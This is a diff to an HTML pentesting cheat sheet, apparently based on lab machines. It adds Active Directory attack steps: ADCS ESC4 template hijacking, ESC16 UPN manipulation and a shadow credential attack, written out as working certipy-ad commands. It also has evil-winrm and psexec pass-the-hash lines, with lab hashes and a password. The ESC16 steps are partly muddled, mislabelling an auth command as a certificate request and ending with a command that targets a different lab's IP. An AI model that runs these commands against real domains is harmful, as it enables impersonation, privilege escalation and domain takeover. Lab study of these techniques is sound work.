@@ -100,7 +100,7 @@
                     <pre><code class="language-bash">crackmapexec smb 10.10.11.51 -u VICTIM_USER -p 'Password123!'</code></pre>   
                 </ul>     
                 
-                <h3>Active Directory Certificate Services (ADCS) | ESC4 </h3>
+                <h3>Active Directory Certificate Services (ADCS) | Template Haijacking - ESC4  </h3>
                 <ul>
                     <p>Having in mind that there is a vulnerable certificate template wich has wrong configuration can be used to request certificates impersonating another user</p>
                     <p>First of all we must have permisions to use that template certificate and this template will be vulnerable if the parameter <b>"Requires Manager Approval"</b> is in <b>"false"</b></p>
@@ -114,6 +114,23 @@
                     <p>Use the certificate obtained to authenticate in the server and get NT hash</p>
                     <pre><code class="language-bash">certipy auth -pfx administrator_administrator.pfx -domain sequel.htb</code></pre>
                     <p>Authenticate using evilwinrm using the NT hash obtained </p>
+                    <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
+                </ul>
+
+                <h3>Active Directory Certificate Services (ADCS) | Security Extension Disabled on CA (Globally) ESC16 </h3>
+                <ul>
+                    <p>Having in mind that CA itself it is configured to disable the inclusion of the szOID_NTDS_CA_SECURITY_EXT securty extension in all certificates it issues </p>
+                    <p>So we can take advantage of it modifiying UPN of a user and requesting a certificate as that user impersonating it</p>
+                    <p>All this information can be found using <b>certipy</b> tool</p>
+                    <p>Read initial UPN of the victim account </p>
+                    <pre><code class="language-bash">certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -user 'ca_svc' read  </code></pre>   
+                    <p>Update the victim account's UPN</p>
+                    <pre><code class="language-bash">certipy-ad account -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update</code></pre>   
+                    <p>Export the .ccache file (You must acquire it using shadow credential attack previously)</p>
+                    <pre><code class="language-bash">export KRB5CCNAME=victim.ccache</code></pre>   
+                    <p>Request a certificate</p>
+                    <pre><code class="language-bash">certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'</code></pre>
+                    <p>Use that hash to authenticate </p>
                     <pre><code class="language-bash">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
                 </ul>
 
@@ -151,7 +168,12 @@
                     <p>Capture the has NTLM and usit to pass the hash in psexec</p>
                     <pre><code class="language-bash">impacket-psexec -hashes :HASH DOMAIN.LOCAL/Administrator@TARGET_IP</code></pre>  
                 </ul>
+
+                <h3>Shadow Credential Attack</h3>
+                <p>Used to escalate privielges. This attack is based on modifying certain attributes of the an AD object to inject a public key in the attribute "msDS-KeyCredentialLink" and then the attacker uses the private key to authenticate as he was the victim. Obtaining a NTLM hash which can be use in pass-the-hass attacks</p>
+                <pre><code class="language-bash">certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'</code></pre>
             </ul>        
+
         </div>
     </div>
 
